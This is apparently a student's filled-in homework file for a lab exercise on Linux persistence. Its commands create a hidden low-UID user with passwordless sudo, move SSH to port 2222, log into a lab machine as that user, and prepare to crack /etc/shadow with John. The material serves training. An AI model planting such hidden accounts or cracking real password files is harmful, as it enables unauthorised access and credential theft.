Please edit this file by adding the solution commands on the line below the prompt.
Save and submit the completed file for your homework submission.
Step 1: Shadow People
Create a secret user named sysd. Make sure this user doesn't have a home folder created:
useradd -M sysd
Give your secret user a password:
passwd sysd (nomore)
Give your secret user a system UID < 1000:
usermod -u 800 sysd
Give your secret user the same GID:
groupmod -g 800 sysd
Give your secret user full sudo access without the need for a password:
sudo visudo
Test that sudo access works without your password:
sudo -l


Step 2: Smooth Sailing
Edit the sshd_config file:
Your bash commands here
sudo nano /etc/ssh/sshd_config
Port 2222

Step 3: Testing Your Configuration Update
Restart the SSH service:
sudo systemctl restart sshd
Exit the root account:
exit
SSH to the target machine using your sysd account and port 2222:
Your solution command here
ssh sysd@192.168.6.105 -p 2222
Use sudo to switch to the root user:
sudo su

Step 4: Crack All the Passwords
SSH back to the system using your sysd account and port 2222:
ssh sysd@192.168.6.105 -p 2222
Escalate your privileges to the root user. Use John to crack the entire /etc/shadow file:
Your solution command here

Copy content - move into nano crackthis
